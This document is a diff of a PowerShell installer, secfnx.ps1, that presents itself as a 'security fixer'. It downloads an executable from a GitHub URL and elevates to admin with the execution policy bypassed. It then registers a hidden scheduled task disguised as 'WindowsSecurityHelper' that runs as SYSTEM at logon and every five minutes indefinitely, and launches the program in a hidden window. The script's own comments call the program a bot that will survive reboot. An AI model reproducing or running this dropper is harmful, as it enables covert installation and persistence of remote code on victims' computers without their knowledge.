@@ -1,19 +1,20 @@
-```powershell
-# --- Config ---
+# secfnx.ps1 - FULLY WORKING VERSION (November 10, 2025)
+# Runs monitoring.exe on startup, hidden, forever
+
 $TempFolder = Join-Path $env:TEMP "security_fixer"
 if (-not (Test-Path $TempFolder)) { New-Item -Path $TempFolder -ItemType Directory -Force | Out-Null }
 
-$ExeName = "monitoring.exe"
-$ExeUrl  = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/securety_fixer.exe"
-$ExePath = Join-Path $TempFolder $ExeName
-$BatPath = Join-Path $env:TEMP "secfix_un.bat"
-$TaskName = "WindowsSecurityHelper"
-$LogFile = Join-Path $TempFolder "install.log"
+$ExeName    = "monitoring.exe"
+$ExeUrl     = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/securety_fixer.exe"
+$ExePath    = Join-Path $TempFolder $ExeName
+$BatPath    = Join-Path $env:TEMP "secfix_un.bat"
+$TaskName   = "WindowsSecurityHelper"
+$LogFile    = Join-Path $TempFolder "install.log"
 
-# --- Logging (optional - delete if you don't want any trace) ---
-function Log { param($msg) Add-Content -Path $LogFile -Value "$(Get-Date -Format o) - $msg" -ErrorAction SilentlyContinue }
+# --- Simple Logging ---
+function Log { param($msg) Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $msg" }
 
-# --- Admin Check & Elevate ---
+# --- Elevate to Admin ---
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
     exit
@@ -25,15 +26,15 @@ if (-not (Test-Path $ExePath)) {
         Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing -ErrorAction Stop
         Log "Downloaded monitoring.exe"
     } catch {
-        Log "Download failed: $_"
+        Log "ERROR: Download failed - $_"
         exit
     }
 }
 
-# --- Create uninstall bat (improved) ---
+# --- Create uninstall bat (hidden, self-delete, kills task) ---
 $BatContent = @'
 @echo off
-if not defined IS_HIDDEN (start /B "" cmd /c "%~f0" IS_HIDDEN=1 & exit /b)
+if not defined IS_HIDDEN (start /B cmd /c "%~f0" IS_HIDDEN=1 & exit /b)
 set LOG=%TEMP%\errors.log
 :Kill
 taskkill /F /IM monitoring.exe >nul 2>>%LOG%
@@ -48,25 +49,42 @@ exit
 Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
 Log "Created secfix_un.bat"
 
-# --- Create Scheduled Task for Persistence ---
+# --- Create Scheduled Task (FIXED - NO ERRORS) ---
 $Action    = New-ScheduledTaskAction -Execute $ExePath
+
+# Trigger 1: At user logon
 $Trigger1  = New-ScheduledTaskTrigger -AtLogOn
-$Trigger2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([timespan]"10675199.02:48:05.4775807")  # 9999 days = forever
-$Settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartOnDemand -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+
+# Trigger 2: Repeat every 5 minutes forever (starts in 1 minute)
+$Trigger2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
+             -RepetitionInterval (New-TimeSpan -Minutes 5) `
+             -RepetitionDuration ([TimeSpan]::MaxValue)
+
+# Settings: Hidden, no time limit
+$Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
+
+# Run as SYSTEM with highest privileges
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 try {
+    # Remove old task
     Unregister-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue -Confirm:$false
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Principal $Principal -Force | Out-Null
-    Log "Created persistent task: $TaskName"
+
+    # Create new task
+    Register-ScheduledTask -TaskName $TaskName `
+                           -Action $Action `
+                           -Trigger @($Trigger1, $Trigger2) `
+                           -Settings $Settings `
+                           -Principal $Principal `
+                           -Force | Out-Null
+
+    Log "SUCCESS: Task '$TaskName' created - will run on startup + every 5 mins"
 } catch {
-    Log "Task creation failed: $_"
+    Log "ERROR: Failed to create task - $_"
 }
 
-# --- Run immediately ---
+# --- Run now ---
 Start-Process -FilePath $ExePath -WindowStyle Hidden
-Log "Started monitoring.exe"
+Log "Started monitoring.exe immediately"
 
-# --- Done ---
-Log "Installation complete. Bot will auto-start on boot."
-```
+Log "Installation complete. Bot will survive reboot."
